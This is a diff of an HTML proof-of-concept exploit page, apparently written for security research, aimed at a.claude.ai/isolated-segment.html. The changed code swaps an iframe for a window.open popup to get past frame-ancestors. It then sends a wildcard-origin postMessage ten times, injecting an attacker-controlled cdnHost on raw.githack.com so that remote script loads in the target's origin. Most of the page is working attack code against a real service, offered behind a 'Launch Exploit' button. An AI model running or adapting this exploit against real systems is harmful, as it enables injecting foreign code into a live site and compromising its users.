@@ -2,50 +2,63 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Anthropic Staging PoC - Domain Hijack</title>
+    <title>Anthropic RCE PoC - Popup Method</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
-        #status { color: #d9534f; font-weight: bold; }
-        iframe { border: 1px solid #ccc; margin-top: 20px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 40px; text-align: center; background: #f4f4f9; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; }
+        button { background: #d9534f; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #c9302c; }
+        #log { margin-top: 20px; color: #555; font-family: monospace; }
     </style>
 </head>
 <body>
-    <h1>Security Research: Isolated Segment PoC</h1>
-    <p>Target: <code>https://a.claude.ai/isolated-segment.html</code></p>
-    <p>Status: <span id="status">Waiting for iframe...</span></p>
 
-    <iframe id="target-iframe" 
-            src="https://a.claude.ai/isolated-segment.html?v=" 
-            width="600" height="400"></iframe>
+    <div class="card">
+        <h1>Vulnerability PoC</h1>
+        <p>Target: <code>a.claude.ai/isolated-segment.html</code></p>
+        <p>This method bypasses <b>frame-ancestors</b> by using <code>window.open</code>.</p>
+        
+        <button onclick="launchExploit()">Launch Exploit</button>
+        
+        <div id="log">Status: Ready</div>
+    </div>
 
     <script>
-        const iframe = document.getElementById('target-iframe');
-        const status = document.getElementById('status');
-
-        // This is your Githack-proxied path to bypass GitHub's MIME type security
-        // It points to the root of your folder structure
+        const log = document.getElementById('log');
         const GITHACK_HOST = "raw.githack.com/CloudWaddie/anthropic-poc/main";
 
-        window.addEventListener('message', (event) => {
-            // Verify message is from the segment script
-            if (event.data.source === 'isolated-segment' && event.data.type === 'iframe_ready') {
-                status.innerText = "Iframe Ready. Sending Exploit...";
-                status.style.color = "orange";
+        function launchExploit() {
+            log.innerText = "Status: Opening target tab...";
+            
+            // 1. Open the target in a new window/tab
+            const targetWin = window.open("https://a.claude.ai/isolated-segment.html", "_blank");
 
-                // Trigger the vulnerability by injecting our own cdnHost
-                iframe.contentWindow.postMessage({
+            if (!targetWin) {
+                log.innerText = "Error: Popup blocked! Please allow popups for this site.";
+                return;
+            }
+
+            // 2. Start a "heartbeat" to send the message. 
+            // Since we can't hear the 'ready' event cross-origin in a popup easily, 
+            // we blast the message multiple times.
+            let attempts = 0;
+            const interval = setInterval(() => {
+                attempts++;
+                log.innerText = `Status: Sending payload (Attempt ${attempts}/10)...`;
+                
+                targetWin.postMessage({
                     target: "isolated-segment",
                     type: "init",
-                    writeKey: "poc-key", 
+                    writeKey: "poc-key",
                     cdnHost: GITHACK_HOST
-                }, "*"); 
-            }
+                }, "*");
 
-            if (event.data.type === 'segment_initialized') {
-                status.innerText = "Exploit Sent! Check for Alert/Console logs.";
-                status.style.color = "green";
-            }
-        });
+                if (attempts >= 10) {
+                    clearInterval(interval);
+                    log.innerText = "Status: Exploit sequence complete. Check the new tab.";
+                }
+            }, 2000); // Send every 2 seconds to ensure the script has loaded
+        }
     </script>
 </body>
 </html>
